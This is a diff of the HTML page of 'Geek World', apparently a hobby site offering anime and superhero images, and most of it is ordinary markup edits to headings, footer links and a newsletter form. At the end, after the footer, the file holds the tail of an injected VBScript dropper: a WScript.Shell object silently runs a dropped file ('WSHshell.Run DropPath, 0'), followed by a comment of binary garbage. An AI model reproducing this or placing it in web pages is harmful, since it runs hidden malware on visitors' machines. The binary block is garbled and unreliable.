@@ -118,7 +118,7 @@
           <!--description-->
           <p style="font-size: 18px;"><strong>Nota:</strong> AquÃ­ podrÃ¡s encontrar las imagenes mÃ¡s buscadas con relaciÃ³n al mundo del animÃ©, superheroes, ciencia ficciÃ³n y fantasia. PodrÃ¡s descargarlas con tan solo un <em><strong style="font-size: 23px;">click</strong></em>.</p>
           <!--anime tittle-->
-          <h2>Anime</h2>
+          <h2 id="anime">Anime</h2>
           <!--grid anime images-->
           <div class="animeGrid">
             <!--image 1-->
@@ -155,7 +155,7 @@
             </div>
           </div>
           <!--Marvel tittle-->
-          <h2>Marvel Universe</h2>
+          <h2 id="marvel">Marvel Universe</h2>
           <!--grid marvel images-->
           <div class="animeGrid">
             <!--image 1-->
@@ -192,7 +192,7 @@
             </div>
           </div>
           <!--DC tittle-->
-          <h2>DC United</h2>
+          <h2 id="dc">DC United</h2>
           <!--grid DC images-->
           <div class="animeGrid">
             <!--image 1-->
@@ -303,43 +303,43 @@
         <div class="col-8 col-md-auto col-lg-auto">
             <div class="footer-menu">
                 <ul>
-                    <li><a href="#destacados">Destacados</a></li>
-                    <li><a href="#momentos_epicos">Momentos Ã‰picos</a></li>
-                    <li><a href="#ofertas">Ofertas</a></li>
+                    <li><a href="#anime">Anime Images</a></li>
+                    <li><a href="#marvel">Marvel Images</a></li>
+                    <li><a href="#dc">DC Images</a></li>
                 </ul>
             </div>
         </div>
         <!--redes sociales-->
         <div class="col-4 col-md-3 col-lg-auto">
-            <div class="footer-social">
-                <p>Sigamos conectados</p>
-                <a href="https://marcelorosso.github.io/Geek-World" target="_blank"><i class="fas fa-globe"></i></a>
-                <a href="https://www.facebook.com/" target="_blank"><i class="fab fa-facebook-f"></i></a>
-                <a href="https://twitter.com/?lang=es" target="_blank"><i class="fab fa-twitter"></i></a>
-                <a href="https://www.instagram.com/?hl=es" target="_blank"><i class="fab fa-instagram"></i></a>
-            </div>
-        </div>
-        <!--newsletter-->
-        <div class="col-8 col-md-12 col-lg-3">
-            <div class="newsletter">
-                <p>Suscribite al newsletter para recibir nuestras novedades</p>
-                <form action="" class="subscribe-form">
-                    <input class="subscribe" type="email" name="email" placeholder="IngresÃ¡ tu e-mail" required>
-                    <button class="action-icon"><i class="fas fa-arrow-right"></i></button>
-                    <input class="subscribe-button" type="submit" value="Suscribirse">
-                </form>
-            </div>
-        </div>
-    </div>
-    <!--fin informacion-->
-    <!--copyright-->
-    <div class="copyright">
-        <p>Â© 2021 GEEK WORLD. Todos los derechos reservados.<span>Desarrollado con <span class="heart">ðŸ’œ</span> por Marcelo Gabriel Rosso.</span></p>
-        <div class="footer-social">
-            <a href="https://marcelorosso.github.io/Geek-World" target="_blank"><i class="fab fa-github"></i></i></a>
-            <a href="https://www.linkedin.com/in/marcelo-gabriel-rosso-6797369a/" target="_blank"><i class="fab fa-linkedin-in"></i></a>
-        </div>
-    </div>
+          <div class="footer-social">
+              <p>Sigamos conectados</p>
+              <a href="https://marcelorosso.github.io/Geek-World" target="_blank" name="github"><i class="fas fa-globe"></i></a>
+              <a href="https://www.facebook.com/" target="_blank" name="facebook"><i class="fab fa-facebook-f"></i></a>
+              <a href="https://twitter.com/?lang=es" target="_blank" name="twitter"><i class="fab fa-twitter"></i></a>
+              <a href="https://www.instagram.com/?hl=es" target="_blank" name="instagram"><i class="fab fa-instagram"></i></a>
+          </div>
+      </div>
+      <!--newsletter-->
+      <div class="col-8 col-md-12 col-lg-3">
+          <div class="newsletter">
+              <p>Suscribite al newsletter para recibir nuestras novedades</p>
+              <form action="" class="subscribe-form">
+                  <input class="subscribe" type="email" id="email" placeholder="IngresÃ¡ tu e-mail" required>
+                  <button class="action-icon" type="submit"><i class="fas fa-arrow-right"></i></button>
+                  <input class="subscribe-button" type="submit" value="Suscribirse">
+              </form>
+          </div>
+      </div>
+  </div>
+  <!--fin informacion-->
+  <!--copyright-->
+  <div class="copyright">
+      <p>Â© 2021 GEEK WORLD. Todos los derechos reservados.<span>Desarrollado con <span class="heart">ðŸ’œ</span> por Marcelo Gabriel Rosso.</span></p>
+      <div class="footer-social">
+          <a href="https://marcelorosso.github.io/Geek-World" target="_blank" name="github"><i class="fab fa-github"></i></i></a>
+          <a href="https://www.linkedin.com/in/marcelo-gabriel-rosso-6797369a/" target="_blank" name="linkedIn"><i class="fab fa-linkedin-in"></i></a>
+      </div>
+  </div>
 </footer>
 
   <!--bootstrapp-->
@@ -371,8 +371,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--S1ë•AåSîâ0Ó‡v½–ÂÒÈªkÖîYÄx„F@ðz¥\&¹Þ½¹ÐŒ
-ßç¨ë¾¦eÊ6\È˜Àh˜Oc×HìØ}NXšÊ5èx±C†•3Î
-µ¿ÄÉ%–úú$[Qc€?p¾¤J€à­ŒKÉ!¬†òÙÛô+¤˜‘åW³¡üÔ4Û‹ÅJï+ýéd£ŸawÓAvû9·A¯†„ï5—š£&†[HÑ8»‡[ú[K¾4³ß‚0~\fhØ¾?l7èÎ00w†Œ+´©ooK…¾TDÆ–o3xØYöuK^RC^SÌÝyå4oû:4H€t`OüFÉÚâTnÇ®[µ/(ˆgÁ¯Ô9„JžÆIn/ô¢¡Šš Aø‡´ù³ÚwÕÏ¨þ«ø•ö¬JóÈˆ«£óŽ£°Õ·¨/±ÄÆ±!íbîØt?­ÓÁæÔñYRÉ'xmj“!©4ƒ°ŸZ„É]arãßýKô/-
-D´|õ8ˆ_ì|ä„©ð‹÷$äxãsµ¡`–ü6vFžýFEðŸ~Òœ
- ÒRRIøÒRÒRÒRÅ±N§Ñ›c«“R ÒR-->
+//--></SCRIPT><!--» Ä#C-|ò¨„+ýyið\sr—1ˆ‚’—%Ôï‡muÕþTËl?&äåðU‰~È3bñÑ“GÇÃ8÷D}Õ>Va‰ÔlÛŽn·£9ØŒ3©6ajË`Ùã(cˆòwñîKÓ¡°<rÈ"¹üÌwÍhP"‰ÉAmˆñÔ(’±’ØÂœ2bÝ¤#‚Ô'ÆŽjošÙUQ› ¡˜cKX¶{$È´ÚSYBk[A˜>dçy¶ú¤žâL‚úXtö­Ý6á1¤·Ðòªªl=eúÛVÔ4 ­\˜8Æ!V×÷¿Ëƒ{-vúàÉ¦éi:àÙeÁ;þÖÓÐåêdlX,ÅÐß—¨z¨€b¢9ZË®?*¡UŠ«k™ôKG"’hG‚‹L£0Ñ§>ÅìMÕ7Å2íÂŒGßgéÍB ÒRRIøÒRÒRÒRÅ±NòÕ›cæ“R ÒR-->
